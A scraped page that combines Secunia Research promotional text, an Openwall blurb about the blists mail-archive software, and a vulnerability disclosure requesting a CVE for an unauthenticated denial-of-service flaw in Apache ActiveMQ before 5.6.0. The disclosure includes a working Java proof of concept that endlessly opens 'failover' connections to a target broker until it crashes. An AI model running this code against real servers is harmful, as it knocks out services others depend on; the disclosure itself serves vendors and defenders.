How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

Subject: CVE Request for Apache ActiveMQ DoS

A flaw in Apache ActiveMQ before 5.6.0 could allow a remote unauthenticated
attacker to abuse the 'failover' feature, allowing them to trigger a denial of
service against the broker service.  An attacker can issue multiple ActiveMQ
openwire connection requests using the string 'failover:tcp://[IP]:61616', and
due to the 'failure' mechanism, all TCP connections remain active even if a
valid session is not created.  After a few thousand requests, a
'java.net.SocketException: Too many open files' exception is triggered, leading
to a freeze or crash of the broker (and possibly connected systems as well).

#### Description

Abusing the 'failover' feature in ActiveMQ, an unauthenticated user can trigger a Denial of Service condition against the broker service.

In detail, an attacker can issue multiple ActiveMQ openwire connection requests using the following connection string:  failover:tcp://<IP>:61616

Due to the 'failure' mechanism, all TCP connections remain active even if a valid session is not created.

Please note that no valid credentials have been used.

After a few thousand requests, a "java.net.SocketException: Too many open files" exception is triggered causing the freeze/crash of the broker. Connected systems may crash as well.

During my test, the attack took around 4 minutes (in a local network) and it is highly reliable. This is most likely an abuse of the 'failover' functionality.

I've been testing version 5.2.0 and also the latest 5.5.0 release. As both releases are affected, I assume that this issue is present in other versions as well. The problem appears in the default configuration as well as with different authentication plugins enabled.

Proof-Of-Concept:

--------------------

package openwireclient;

import javax.jms.\*;

import org.apache.activemq.ActiveMQConnectionFactory;

public class GoAndCrash {

private static String url = "failover:tcp://";

public static void main(String[] args) throws JMSException {

System.out.println("\n--[ ActiveMQ Denial of Service PoC ]\n");

url = url.concat(args[0] + ":" + args[1]);

int cont = 0;

while (true) {

try

{
System.out.println("[\*] Request #" + cont);
ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("invalidUser", "invalidPass", url);
Connection connection = connectionFactory.createConnection();
cont++;
connection.start();
}

catch (Exception ex)

{
//do nothing
}

}

}

}
